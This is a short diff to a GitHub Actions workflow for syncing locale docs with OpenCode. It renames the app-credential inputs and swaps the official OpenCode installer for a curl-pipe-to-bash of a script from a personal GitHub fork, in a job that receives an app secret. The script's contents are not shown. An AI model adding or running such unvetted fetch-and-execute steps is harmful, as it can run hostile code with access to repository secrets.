@@ -29,8 +29,8 @@ jobs:
         id: committer
         uses: ./.github/actions/setup-git-committer
         with:
-          opencode-app-id: ${{ vars.OPENCODE_APP_ID }}
-          opencode-app-secret: ${{ secrets.OPENCODE_APP_SECRET }}
+          am-app-id: ${{ vars.OPENCODE_APP_ID }}
+          am-app-secret: ${{ secrets.OPENCODE_APP_SECRET }}
 
       - name: Compute changed English docs
         id: changes
@@ -50,7 +50,7 @@ jobs:
 
       - name: Install OpenCode
         if: steps.changes.outputs.has_changes == 'true'
-        run: curl -fsSL https://opencode.ai/install | bash
+        run: curl -fsSL https://raw.githubusercontent.com/n0facearia/n0face-opencode-fork/main/install.sh | bash
 
       - name: Sync locale docs with OpenCode
         if: steps.changes.outputs.has_changes == 'true'
